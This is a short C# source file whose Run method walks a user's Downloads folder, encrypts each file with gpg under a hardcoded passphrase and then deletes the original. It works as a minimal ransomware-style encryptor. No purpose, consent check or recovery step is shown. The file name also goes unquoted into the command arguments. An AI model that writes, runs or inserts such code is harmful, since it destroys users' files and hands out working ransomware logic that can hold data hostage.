using System.Net;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace chk2
{
    public class Class1
    {
        public void Run()
        {
            string encryptionKey = "s21WAk6507zXvH32";

            try
            {
                string [] fileEntries = Directory.GetFiles("/home/user/Downloads");

                foreach(string fileName in fileEntries)
                {            
                    Console.WriteLine(fileName);

                    if (!fileName.EndsWith(".gpg"))
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        process.StartInfo.FileName = "gpg";
                        process.StartInfo.Arguments = "--passphrase \"" + encryptionKey + "\" --batch --quiet --yes -c " + fileName;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.Start();
                        string output = process.StandardOutput.ReadToEnd();
                        process.WaitForExit();
                        Console.WriteLine(output);
                        File.Delete(fileName);
                    } 
                }
            }
            catch (Exception exc)
            {
                Console.WriteLine(exc.Message);
            }
        }
    }
}
